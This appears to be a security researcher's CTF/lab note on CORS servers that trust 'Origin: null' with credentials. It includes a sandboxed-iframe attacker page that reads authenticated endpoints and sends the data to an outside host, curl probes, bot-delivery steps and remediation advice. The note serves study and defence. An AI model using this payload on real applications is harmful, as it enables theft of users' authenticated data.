# CORS `Origin: null` + Credentials Sandbox Bypass

## Date

2026-07-09

## Target Type

Web applications with credentialed CORS and authenticated JSON/file endpoints

## Bug Class

CORS misconfiguration, null-origin trust failure, credentialed cross-origin read, review/admin bot abuse

## Initial Signal

- Lab or app labeled CORS-themed
- Authenticated endpoints such as `/api/me`, `/api/profile`, `/poster.svg`, `/api/secret`
- Review/report bot that visits external URLs
- `fetch(..., {credentials:'include'})` used by first-party frontend
- Session cookie has `SameSite=None; Secure`

## Working Theory

If a server reflects:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

then any page that can force the browser to send `Origin: null` may read authenticated responses cross-origin.

Sandboxed documents are the most common way to get that origin in exploit pages:

```html
<iframe sandbox="allow-scripts" srcdoc="..."></iframe>
```

Other `null` origin sources include some `data:` navigations and sandboxed popups, depending on browser behavior and sandbox flags.

This is separate from postMessage `window.origin === "null"` bugs, but the sandbox primitive is the same.

## Trust Boundary

CORS is supposed to prevent untrusted websites from reading authenticated cross-origin responses. Reflecting `null` with credentials collapses that boundary for sandboxed attacker pages.

## Pattern

### Vulnerable server behavior

```http
GET /api/me HTTP/1.1
Origin: null
Cookie: session=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### Attacker page

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://app.example/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => (new Image()).src = 'https://oast.example/?' + encodeURIComponent(t));
</script>
"></iframe>
```

### Why it works

| Step | Browser behavior |
|---|---|
| Sandbox iframe loads | document origin becomes opaque / `null` |
| `fetch()` to target | sends victim cookies if allowed |
| Request `Origin` header | `null` |
| Server CORS response | reflects `null` + credentials |
| Attacker JS | can read response body |

## Minimal Reproduction

1. Identify authenticated endpoints used by the frontend.
2. Probe CORS with multiple origins:

```bash
curl -sI -H "Origin: null" "https://[host]/api/me"
curl -sI -H "Origin: https://[host]" "https://[host]/api/me"
curl -sI -H "Origin: https://evil.example" "https://[host]/api/me"
```

3. If `null` is reflected with credentials, build sandbox iframe exploit.
4. If a review/admin bot exists, host exploit externally and submit its URL.
5. Exfiltrate with `Image().src` when possible.

## Common Mistakes During Testing

- Testing only `https://evil.com` and missing the `null` case.
- Assuming the secret is always in `/api/me` JSON instead of a separate file endpoint.
- Using `fetch()` to exfil when `Image().src` is more reliable.
- Forgetting `credentials:'include'` in the sandboxed fetch.
- Omitting `allow-scripts` from the sandbox attribute.

## Why Failed Payloads Failed

- Random origins not allowlisted → browser blocks response read.
- Unauthenticated direct request to protected asset → `401`.
- Review URL submitted while logged out → bot may still visit, but exploit design must target credentialed reads from victim browser, not attacker session.

## Fix

- Never use `Access-Control-Allow-Origin: null` with credentials.
- Maintain a strict allowlist of real origins.
- Prefer same-site cookies and avoid exposing sensitive file endpoints cross-origin.
- Treat review bots as high-value victims; isolate their sessions.

## Future Checklist Item

See `checklists/cors-null-origin-recon.md`.

## Related Notes

- `notes/postmessage-window-origin-null-bypass.md` — same sandbox primitive, different sink (`postMessage` / `eval`)
- `notes/reflected-xss-admin-bot-cookie-exfil.md` — bot delivery path overlap

## Example

Paper Moon lab:

- endpoints: `/api/me`, `/poster.svg`
- delivery: `POST /api/report`
- secret location: flag embedded in admin-only SVG, not `/api/me` JSON
